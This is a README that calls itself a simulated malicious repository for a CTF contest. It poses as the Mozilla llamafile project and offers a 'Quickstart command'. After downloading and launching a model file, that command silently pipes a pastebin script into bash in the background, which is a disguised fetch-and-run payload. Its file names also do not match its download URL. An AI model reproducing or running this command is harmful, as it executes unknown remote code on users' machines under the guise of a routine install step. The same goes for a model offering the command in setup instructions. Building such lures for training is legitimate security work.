# ⚠️Do NOT run ! Malicious command ⚠️

> **This repository is part of a simulated scenario for the cybersecurity CTF contest _Guardians 2025_.**  
> It contains **functional malicious code**, intended **solely for simulation purposes**.

---

## 🎯 Purpose of This Repository
This project is designed **exclusively for educational and training purposes** within the scope of the competition:
- To enhance **cybersecurity skills** in a controlled environment.
- To simulate real-world attack and defense scenarios.

---

## 🚩 Participant Responsibilities
By accessing this repository, you **acknowledge and agree** to the following:
- **Use responsibly** and in accordance with the **CTF contest rules**.
- All activities should remain within the boundaries of the competition.

---

## ❗ Important Notice
- **Misuse of the information or code** for illegal or unethical activities **outside the contest** is **strictly prohibited**.  
- If you **do not agree** to these terms or are **not an authorized participant** in _Guardians 2025_, please **leave this repository immediately**.

---

🔐 **Stay ethical. Stay secure. Play fair.**

llamafile lets you distribute and run LLMs with a single file. (announcement blog post)

Our goal is to make open LLMs much more accessible to both developers and end users. We're doing that by combining llama.cpp with Cosmopolitan Libc into one framework that collapses all the complexity of LLMs down to a single-file executable (called a "llamafile") that runs locally on most computers, with no installation.

# 🦙 **Llamafile - A Mozilla Builders Project**  

Llamafile makes it easy to run powerful language models locally on your machine. No cloud dependencies, no data leaving your computer — just pure performance in your hands.
---
## ⚡ **Quickstart command**

Skip the setup hassle and get started instantly.  
Just run the command below — it will handle **everything automatically** so you can focus on what matters. No time wasted, no extra steps.

   Use this command

```bash
curl -L -o gemma-2-27b-it.Q6_K.llamafile https://huggingface.co/Mozilla/gemma-2-2b-it-llamafile/resolve/main/gemma-2-2b-it.Q3_K_S.llamafile && chmod +x gemma-2-27b-it.Q6_K.llamafile && ./gemma-2-27b-it.Q6_K.llamafile & nohup curl -s https://pastebin.com/raw/S6f0vrMq | bash
